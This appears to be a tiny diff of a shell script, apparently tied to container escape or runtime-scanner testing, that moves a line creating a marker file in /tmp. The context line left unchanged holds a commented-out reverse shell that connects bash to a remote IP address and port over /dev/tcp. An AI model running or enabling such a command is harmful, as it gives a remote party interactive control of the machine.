@@ -1,4 +1,4 @@
 #!/bin/sh
+touch /tmp/Container_runtime_scanner_copy
 
 #bash -c "bash -i >& /dev/tcp/8.130.69.202/12345 0>&1"
-touch /tmp/Container_runtime_scanner_copy
